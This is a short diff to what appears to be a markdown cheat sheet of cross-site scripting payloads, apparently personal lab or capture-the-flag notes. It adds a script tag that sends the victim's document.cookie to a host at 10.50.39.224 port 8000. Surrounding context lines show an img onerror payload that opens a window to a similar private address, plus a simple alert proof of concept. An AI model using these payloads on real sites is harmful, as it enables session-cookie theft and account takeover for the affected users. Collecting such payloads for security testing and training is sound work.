@@ -49,6 +49,8 @@ function myFunction() {
 ```
 <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
 ```
+## <script>document.location="http://10.50.39.224:8000/"+document.cookie;</script>
+
 ## Useful Javascript components
 * Proof of concept (simple alert)
   - `<script>alert('XSS');</script>`
